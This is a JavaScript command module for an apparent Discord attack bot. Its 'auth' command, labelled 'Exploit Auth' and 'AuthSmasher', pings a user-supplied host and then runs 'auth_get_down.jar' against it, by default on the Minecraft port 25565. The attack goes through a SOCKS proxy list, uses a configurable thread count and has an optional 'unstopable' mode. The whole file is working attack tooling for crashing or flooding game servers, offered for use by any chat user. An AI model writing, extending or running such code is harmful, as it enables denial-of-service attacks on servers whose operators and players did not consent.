/** format */

const Command = require('../structure/command.js');
const threads = require('../jsons/threads.json');
const Attack = require('../structure/attack.js');
const ping = require('ping');
const crashers = require('../functions/crashers.js');
const config = require('../jsons/config.json');
const Discord = require('discord.js');

module.exports = new Command({
    name: "auth",
    description: "Exploit Auth",
    permissions: "SEND_MESSAGES",
    disableOnAttack: true,
    slashCommandOptions: [{
        name: "host",
        type: Discord.ApplicationCommandOptionType.String,
        description: "Enter host or ip server",
        required: true
    }, {
        name: "port",
        description: "Enter port server",
        type: Discord.ApplicationCommandOptionType.Number,
        required: false
    }, {
        name: "unstopable",
        description: "Unstopable testing",
        type: Discord.ApplicationCommandOptionType.Boolean,
        required: false
    }],
    async execute(client, args, interaction) {
        let host = args.getString("host");
        let port = args.getNumber("port");
        const unstop = args.getBoolean("unstopable") || false;

        interaction.deferReply({ fetchReply: true }).then((msg) => {
            ping.sys.probe(host, async (alive, err) => {
                if (alive) {
                    if (config.autoResolver && !port) {
                        try {
                            const res = crashers.autoResolver(host);
                            host = res.host;
                            port = res.port;
                        } catch {}
                    }

                    const attack = new Attack({
                        jaroptions: {
                            jarname: "auth_get_down.jar",
                            jarargs: `${host}:${port ? port : 25565} ${threads.auth} 0 auth socks_proxies.txt`
                        },
                        client: client,
                        interaction: interaction,
                        msgID: msg.id,
                        AttacksArray: client.attacks,
                        method: "AuthSmasher 💥",
                        host: host,
                        port: `${port}`,
                        unstopable: unstop,
                        ownerID: interaction.user.id
                    })

                    client.attacks.set(msg.id, attack);
                } else return await crashers.errorembed(client, interaction, interaction.commandName, "**Время ожидания отклика сервера вышло.**\n\nСкорее всего сервер выключен или IP введен некоректно. Проверьте правильность IP и повторите попытку.", true);
            })
        })

    }
});